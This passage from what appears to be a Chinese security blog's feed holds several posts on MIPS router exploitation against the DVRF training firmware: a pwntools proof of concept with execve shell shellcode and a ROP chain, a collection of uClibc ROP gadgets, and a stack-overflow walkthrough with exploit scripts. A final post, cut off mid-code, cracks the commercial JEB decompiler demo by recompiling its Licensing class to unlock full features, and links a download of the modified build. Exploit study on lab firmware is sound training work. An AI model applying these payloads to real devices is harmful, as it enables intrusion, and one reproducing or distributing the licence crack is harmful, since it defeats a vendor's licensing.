<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509163815793mv4b39p0.png?imageslim" alt="paste image"><br>OK, 现在我们已经可以控制程序的 <code>$pc</code>寄存器了，下一步就是利用的方法了。使用前文的那个 rop 链，我们需要可以控制 <code>$s1</code>寄存器。但是这里我们并没有办法控制。不过在 <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-MIPS-rop-gadgets%E8%AE%B0%E5%BD%95%E8%B4%B4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html">这里</a>提到，在 <code>uclibc</code> 的 <code>scandir</code> 或者 <code>scandir64</code> 的函数末尾有一个<code>gadgets</code> 可以操控几乎所有寄存器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">.text:0000AFE0                 lw      $ra, 0x40+var_4($sp)</div><div class="line">.text:0000AFE4                 lw      $fp, 0x40+var_8($sp)</div><div class="line">.text:0000AFE8                 lw      $s7, 0x40+var_C($sp)</div><div class="line">.text:0000AFEC                 lw      $s6, 0x40+var_10($sp)</div><div class="line">.text:0000AFF0                 lw      $s5, 0x40+var_14($sp)</div><div class="line">.text:0000AFF4                 lw      $s4, 0x40+var_18($sp)</div><div class="line">.text:0000AFF8                 lw      $s3, 0x40+var_1C($sp)</div><div class="line">.text:0000AFFC                 lw      $s2, 0x40+var_20($sp)</div><div class="line">.text:0000B000                 lw      $s1, 0x40+var_24($sp)</div><div class="line">.text:0000B004                 lw      $s0, 0x40+var_28($sp)</div><div class="line">.text:0000B008                 jr      $ra</div><div class="line">.text:0000B00C                 addiu   $sp, 0x40</div><div class="line">.text:0000B00C  # End of function scandir64</div></pre></td></tr></table></figure>
<p>于是利用的思路就很明确了。首先使用这段 <code>rop gadgets</code> 设置好寄存器，然后进入前文所说的 <code>rop</code> 链中执行。<br>最后的poc如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">from pwn import *</div><div class="line">context.endian = &quot;little&quot;</div><div class="line">context.arch = &quot;mips&quot;</div><div class="line"></div><div class="line">payload = &quot;&quot;</div><div class="line"></div><div class="line"># NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)</div><div class="line">for i in range(30):</div><div class="line">    payload += &quot;\x26\x40\x08\x01&quot;</div><div class="line"></div><div class="line"># execve shellcode translated from MIPS to MIPSEL</div><div class="line"># http://shell-storm.org/shellcode/files/shellcode-792.php</div><div class="line">payload += &quot;\xff\xff\x06\x28&quot;  # slti $a2, $zero, -1</div><div class="line">payload += &quot;\x62\x69\x0f\x3c&quot;  # lui $t7, 0x6962</div><div class="line">payload += &quot;\x2f\x2f\xef\x35&quot;  # ori $t7, $t7, 0x2f2f</div><div class="line">payload += &quot;\xf4\xff\xaf\xaf&quot;  # sw $t7, -0xc($sp)</div><div class="line">payload += &quot;\x73\x68\x0e\x3c&quot;  # lui $t6, 0x6873</div><div class="line">payload += &quot;\x6e\x2f\xce\x35&quot;  # ori $t6, $t6, 0x2f6e</div><div class="line">payload += &quot;\xf8\xff\xae\xaf&quot;  # sw $t6, -8($sp)</div><div class="line">payload += &quot;\xfc\xff\xa0\xaf&quot;  # sw $zero, -4($sp)</div><div class="line">payload += &quot;\xf4\xff\xa4\x27&quot;  # addiu $a0, $sp, -0xc</div><div class="line">payload += &quot;\xff\xff\x05\x28&quot;  # slti $a1, $zero, -1</div><div class="line">payload += &quot;\xab\x0f\x02\x24&quot;  # addiu;$v0, $zero, 0xfab</div><div class="line">payload += &quot;\x0c\x01\x01\x01&quot;  # syscall 0x40404</div><div class="line">shellcode = payload</div><div class="line"></div><div class="line"></div><div class="line">padding = &quot;O&quot; * 508</div><div class="line">payload = padding</div><div class="line">payload += p32(0x766effe0)</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += &apos;A&apos; * 4  # $s0</div><div class="line">payload += p32(0x7670303c)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += &apos;A&apos; * 4  # $s3</div><div class="line">payload += &apos;A&apos; * 4  # $s4</div><div class="line">payload += &apos;A&apos; * 4  # $s5</div><div class="line">payload += &apos;A&apos; * 4  # $s6</div><div class="line">payload += &apos;A&apos; * 4  # $s7</div><div class="line">payload += &apos;A&apos; * 4  # $fp</div><div class="line">payload += p32(0x76714b10)  # $ra for jmp</div><div class="line"></div><div class="line"># stack for gadget 2</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += &apos;A&apos; * 4  # $s0</div><div class="line">payload += p32(0x0002F2B0 + 0x766e5000)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += p32(0x766fbdd0)  # $ra</div><div class="line"></div><div class="line"></div><div class="line"># stack for gadget 2 for second</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += p32(0x767064a0)  # $s0  for jmp stack</div><div class="line">payload += p32(0x0002F2B0 + 0x766e5000)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += p32(0x766fbdd0)  # $ra for get stack addr</div><div class="line"></div><div class="line"># stack for shellcode</div><div class="line">payload += shellcode</div><div class="line"></div><div class="line">payload = &quot;A&quot; * 508 + &apos;B&apos; * 4</div><div class="line"></div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div><div class="line"></div><div class="line"></div><div class="line"># base 0x766e5000</div></pre></td></tr></table></figure></p>
<p>可以执行完毕 <code>shellcode</code> , 不过执行完后就异常了。神奇。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在调试rop时可以先在调试器中修改寄存器，内存数据来模拟实现，然后在写到脚本里面。</p>
<p>参考链接：</p>
<p><a href="https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/" target="_blank" rel="external">https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MIPS rop gadgets记录贴&&持续更新]]></title>
      <url>/2017/10/27/MIPS_rop_gadgets_collects.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本帖记录一些常用的,效果好的 rop gadgets.</p>
<p><strong>uClibc</strong></p>
<p><strong>从栈中设置<code>$t9</code> 并跳到 <code>$t9</code> 的gadgets , <code>__thread_start</code> 函数第二行</strong></p>
<p>使用 <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%98.html">案例</a></p>
<p>使用tips:</p>
<ul>
<li>调用函数时，进入函数内部时要求 <code>$t9</code> 指向函数的起始地址。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lw      $t9, arg_0($sp)</div><div class="line">jalr    $t9</div></pre></td></tr></table></figure>
<p><strong>四个组合使用，调用栈中 shellcode 的 rop_gadget , 需要可以控制 <code>$s1</code>,</strong></p>
<p>详细分析在<a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html">这里
</a></p>
<p>rop_gadget 1, <strong>设置 参数一 为 1</strong>，位于 <code>__uClibc_main</code> ,可以使用 <code>mipsrop.find(&quot;li $a0, 1&quot;)</code> 查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">LOAD:00055C60                 li      $a0, 1</div><div class="line">LOAD:00055C64                 move    $t9, $s1</div><div class="line">LOAD:00055C68                 jalr    $t9 ; sub_55960</div><div class="line">LOAD:00055C5C                 lui     $s0, 2</div></pre></td></tr></table></figure></p>
<p>rop_gadget 2，<strong>从栈中设置寄存器</strong>，使用 <code>mipsrop.tail()</code> 查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">LOAD:0001E20C                 move    $t9, $s1</div><div class="line">LOAD:0001E210                 lw      $ra, 0x28+var_4($sp)</div><div class="line">LOAD:0001E214                 lw      $s2, 0x28+var_8($sp)</div><div class="line">LOAD:0001E218                 lw      $s1, 0x28+var_C($sp)</div><div class="line">LOAD:0001E21C                 lw      $s0, 0x28+var_10($sp)</div><div class="line">LOAD:0001E220                 jr      $t9</div><div class="line">LOAD:0001E224                 addiu   $sp, 0x28</div></pre></td></tr></table></figure></p>
<p>rop_gadget 3，<strong>获取栈地址</strong>，使用 <code>mipsrop.stackfinder()</code> 查找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">LOAD:000164C0                 addiu   $s2, $sp, 0x198+var_180</div><div class="line">LOAD:000164C4                 move    $a2, $v1</div><div class="line">LOAD:000164C8                 move    $t9, $s0</div><div class="line">LOAD:000164CC                 jalr    $t9 ; mempcpy</div><div class="line">LOAD:000164D0                 move    $a0, $s2</div></pre></td></tr></table></figure>
<p>rop_gadget 4，<strong>通过 <code>$t9</code>, 跳转到 <code>$s2</code></strong>，使用 <code>mipsrop.find(&quot;move    $t9, $s2&quot;)</code> 查找, 位于 <code>readdir</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LOAD:000118A4                 move    $t9, $s2</div><div class="line">LOAD:000118A8                 jalr    $t9</div></pre></td></tr></table></figure></p>
<p><strong>从栈中取数据到寄存器, <code>opendir</code>  函数尾部</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:0000AA6C                 lw      $ra, 0xC0+var_4($sp)</div><div class="line">.text:0000AA70                 lw      $s2, 0xC0+var_8($sp)</div><div class="line">.text:0000AA74                 lw      $s1, 0xC0+var_C($sp)</div><div class="line">.text:0000AA78                 lw      $s0, 0xC0+var_10($sp)</div><div class="line">.text:0000AA7C                 jr      $ra</div><div class="line">.text:0000AA80                 addiu   $sp, 0xC0</div><div class="line">.text:0000AA80  # End of function opendir</div></pre></td></tr></table></figure></p>
<p><strong>从栈中设置基本上所有的重要寄存器，位于 <code>scandir</code> 或者 <code>scandir64</code>尾部</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">LOAD:00011BB0                 lw      $ra, 0x40+var_4($sp)</div><div class="line">LOAD:00011BB4                 lw      $fp, 0x40+var_8($sp)</div><div class="line">LOAD:00011BB8                 lw      $s7, 0x40+var_C($sp)</div><div class="line">LOAD:00011BBC                 lw      $s6, 0x40+var_10($sp)</div><div class="line">LOAD:00011BC0                 lw      $s5, 0x40+var_14($sp)</div><div class="line">LOAD:00011BC4                 lw      $s4, 0x40+var_18($sp)</div><div class="line">LOAD:00011BC8                 lw      $s3, 0x40+var_1C($sp)</div><div class="line">LOAD:00011BCC                 lw      $s2, 0x40+var_20($sp)</div><div class="line">LOAD:00011BD0                 lw      $s1, 0x40+var_24($sp)</div><div class="line">LOAD:00011BD4                 lw      $s0, 0x40+var_28($sp)</div><div class="line">LOAD:00011BD8                 jr      $ra</div><div class="line">LOAD:00011BDC                 addiu   $sp, 0x40</div><div class="line">LOAD:00011BDC  # End of function scandir</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之栈溢出实战]]></title>
      <url>/2017/10/27/step_by_step_pwn_router_part3.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
<hr>
<p>本文以 <a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="external">DVRF</a> 中的第一个漏洞程序 <code>stack_bof_01</code> 为例，在实战 <code>MIPS</code> 架构中栈溢出的简单利用。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>去github上面把 DVRF 下载下来，然后用 <code>binwalk</code> 解开</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15090843759335sjlc5jz.png?imageslim" alt="paste image"></p>
<p>在 <code>pwnable</code> 目录下就是相应的示例程序</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509084462823wk11dwv2.png?imageslim" alt="paste image"><br>在解开的文件系统的根目录下使用 <code>chroot</code> 和 <code>qemu</code> 运行 程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01  &quot;`cat ./pwnable/Intro/input`&quot;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509084652810a9d812lx.png?imageslim" alt="paste image"></p>
<p>使用了<code>cat</code> 命令读取文件作为命令行参数，传给目标程序，这样可以使我们输入一些不可见字符用于劫持程序流。</p>
<p><code>stack_bof_01</code> 是一个很简单的栈溢出漏洞程序，它把用户从命令行传过去的参数直接使用 <code>strcpy</code> 拷贝到栈缓冲区，从而栈溢出。经过调试，输入204个字符后就可以覆盖到 <code>ra</code> 寄存器保存到栈栈上的值，进而可以控制 <code>$pc</code> 的值。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509085110075dfzfw3j4.png?imageslim" alt="paste image"><br>修改文件内容的 <code>python</code> 脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">padding = &quot;O&quot; * 204</div><div class="line">payload = padding + &quot;B&quot;*4</div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div></pre></td></tr></table></figure>
<p>接下来就是考虑该如何利用的问题了。程序中包含了一个 执行 <code>system(&quot;/bin/sh&quot;)</code> 的函数 <code>dat_shell</code>, 如果是在 <code>x86</code> 平台下的话，我们直接设置 <code>$pc</code> 寄存器到它的地址就可以了。在 <code>MIPS</code> 如果直接指过去或怎么样呢？我们试试</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509085500227rnxajrt2.png?imageslim" alt="paste image"></p>
<p>访问了非法内存，异常了。<br>原因在于，在 MIPS 中，函数内部会通过 <code>$t9</code> 寄存器和 <code>$gp</code> 寄存器来找数据，地址等。同时在 <code>mips</code> 的手册内默认 <code>$t9</code> 的值为当前函数的开始地址，这样才能正常的索引，所以我们需要先用一个 <code>rop_gadget</code> 设置 <code>$t9</code>, 然后再跳到 <code>dat_shell</code> 函数。<br>在libc 中可以找到这样一个gadgets<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.text:00006B20                 lw      $t9, arg_0($sp)</div><div class="line">.text:00006B24                 jalr    $t9</div></pre></td></tr></table></figure></p>
<p>加上libc的基地址就行了。用qemu-mipsel-static模拟程序是看不到目标程序的maps的，所以我们可以通过打印 <code>got</code> 表的函数指针，然后计算偏移得到 <code>libc</code> 的基地址。</p>
<p>所以我们现在的利用流程就是:</p>
<ul>
<li>修改返回地址到 <code>rop_gadget</code>, 设置 <code>$r9</code> 为 <code>dat_shell</code> 函数的地址</li>
<li>跳转到 <code>dat_shell</code> 函数，执行<code>system</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">padding = &quot;O&quot; * 204</div><div class="line">gadget1 = &quot;\x20\xbb\x6e\x76&quot;</div><div class="line">dat_shell_addr = &quot;\x50\x09\x40&quot;  # Partial overwrite with little-endian arch</div><div class="line">payload = padding + gadget1 + dat_shell_addr</div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509086115477pcnvhh8c.png?imageslim" alt="paste image"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>学习到了 <code>$t9</code> 寄存器的重要作用以后再使用 <code>rop</code> 调用函数时，要使用 <code>jalr $t9</code> 类的 <code>gadgets</code> 以保证进入函数后， <code>$t9</code> 的值为函数的起始地址，避免出错。</p>
</li>
<li><p>使用ida反汇编mips程序时，它好像默认  <code>$t9</code> 的值为函数的起始地址,导致我们分析问题时造成困惑，pwndbg 和 <a href="http://www.radare.org/r/" target="_blank" rel="external">radare2</a> 就不会这样。</p>
</li>
</ul>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509086721263tsioi5wr.png?imageslim" alt="paste image"></p>
<p>感觉mips下还是 pwndbg 和 <a href="http://www.radare.org/r/" target="_blank" rel="external">radare2</a>靠谱</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/" target="_blank" rel="external">https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/</a></li>
</ul>
<p>注：</p>
<p>&emsp;&emsp;本文先发布于：<a href="https://xianzhi.aliyun.com/forum/topic/1510/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1510/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[破解 jeb  2.3.7 demo]]></title>
      <url>/2017/10/27/crack_jeb_mips_2_3_7.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用的技术和上文的一样。</p>
<p><code>mips</code> 版本的修改版</p>
<p>百度云：</p>
<p>链接: <a href="https://pan.baidu.com/s/1c1Oh0x6" target="_blank" rel="external">https://pan.baidu.com/s/1c1Oh0x6</a> 密码: ekjj</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>安卓版</strong></p>
<p><code>jeb-2.3.7.201710262129-JEBDecompilerDemo-121820464987384338</code></p>
<p>重新编译一个 <code>com.pnfsoftware.jeb.client.Licensing</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div></pre></td><td class="code"><pre><div class="line">//</div><div class="line">// Source code recreated from a .class file by IntelliJ IDEA</div><div class="line">// (powered by Fernflower decompiler)</div><div class="line">//</div><div class="line"></div><div class="line">package com.pnfsoftware.jeb.client;</div><div class="line"></div><div class="line">import com.pnfsoftware.jeb.AssetManager;</div><div class="line">import com.pnfsoftware.jeb.util.format.Strings;</div><div class="line">import com.pnfsoftware.jeb.util.logging.GlobalLog;</div><div class="line">import com.pnfsoftware.jeb.util.logging.ILogger;</div><div class="line">import com.pnfsoftware.jebglobal.GN;</div><div class="line">import com.pnfsoftware.jebglobal.mW;</div><div class="line"></div><div class="line">public final class Licensing &#123;</div><div class="line">    private static final ILogger logger = GlobalLog.getLogger(Licensing.class);</div><div class="line">    public static final String user_email = &quot;love_lh@hac425.com&quot;;</div><div class="line">    public static final String user_group = &quot;hacker&quot;;</div><div class="line">    public static final int user_id = 2116188757;</div><div class="line">    public static final String user_name = &quot;hac425&quot;;</div><div class="line">    public static final int user_count = 20;</div><div class="line">    public static final int license_ts = 0;</div><div class="line">    public static final int license_validity = 40000;</div><div class="line">    public static int real_license_ts = 0;</div><div class="line">    public static int build_type = 0;</div><div class="line">    public static final int FLAG_AIRGAP = 8;</div><div class="line">    public static final int FLAG_ANYCLIENT = 16;</div><div class="line">    public static final int FLAG_COREAPI = 32;</div><div class="line">    public static final int FLAG_DEBUG = 1;</div><div class="line">    public static final int FLAG_FLOATING = 4;</div><div class="line">    public static final int FLAG_FULL = 2;</div><div class="line">    public static final int FLAG_JEB2 = 128;</div><div class="line"></div><div class="line"></div><div class="line">    static &#123;</div><div class="line">        int v0 = Licensing.build_type | 2;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 4;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 8;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 16;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        v0 |= 32;</div><div class="line">        Licensing.build_type = v0;</div><div class="line">        Licensing.build_type = v0 | 128;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    public Licensing() &#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final void setLicenseTimestamp(int var0) &#123;</div><div class="line">        real_license_ts = 1505267330;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final int getExpirationTimestamp() &#123;</div><div class="line">        return real_license_ts + 345600000;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final int getBuildType() &#123;</div><div class="line">        return build_type;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isDebugBuild() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isReleaseBuild() &#123;</div><div class="line">        return !isDebugBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isFullBuild() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isDemoBuild() &#123;</div><div class="line">        return !isFullBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isFloatingBuild() &#123;</div><div class="line">        return (build_type &amp; 4) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isIndividualBuild() &#123;</div><div class="line">        return !isFloatingBuild();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isAirgapBuild() &#123;</div><div class="line">        return (build_type &amp; 8) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean isInternetRequired() &#123;</div><div class="line">        return false;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean allowAnyClient() &#123;</div><div class="line">        return (build_type &amp; 16) != 0;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final boolean canUseCoreAPI() &#123;</div><div class="line">        return true;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static final String getBuildTypeString() &#123;</div><div class="line">        StringBuilder var0 = new StringBuilder();</div><div class="line">        if (isReleaseBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-119, 23, 9, 9, 4, 18, 22, 74&#125;, 1, 251));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;35, 1, 7, 23, 18, 72&#125;, 1, 71));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isFullBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;37, 26, 28, 21, 93&#125;, 2, 39));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;39, 10, 29, 22, 93&#125;, 2, 200));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isFloatingBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;-114, 10, 3, 14, 21, 29, 7, 9, 72&#125;, 1, 232));</div><div class="line">        &#125; else &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;42, 1, 20, 16, 4, 0, 3, 29, 21, 76, 7&#125;, 2, 150));</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (isAirgapBuild()) &#123;</div><div class="line">            var0.append(mW.UU(new byte[]&#123;34, 6, 2, 84, 21, 8, 23, 71&#125;, 2, 100));</div><div class="line">        &#125; else &#123;</div><div class="line">            